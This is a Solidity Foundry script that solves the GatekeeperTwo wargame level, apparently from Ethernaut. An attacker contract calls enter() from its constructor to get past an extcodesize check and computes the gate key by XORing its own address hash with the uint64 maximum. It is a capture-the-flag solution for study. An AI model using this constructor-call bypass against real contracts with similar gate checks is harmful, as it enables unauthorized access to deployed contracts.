// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperTwo.sol";
import "../lib/forge-std/src/Script.sol";

contract AttackGatekeeperTwo {
    GatekeeperTwo public victimInstance;
    constructor(address _victimAddress) {
        victimInstance = GatekeeperTwo(_victimAddress);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        victimInstance.enter(key);
    }
}
contract GatekeeperTwoSolution is Script {
    GatekeeperTwo victimInstance = GatekeeperTwo(0x933D942b64006CaaA22DC21609b6fA59D953C087);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackGatekeeperTwo attacker = new AttackGatekeeperTwo(address(victimInstance)); 

        vm.stopBroadcast();
    }
}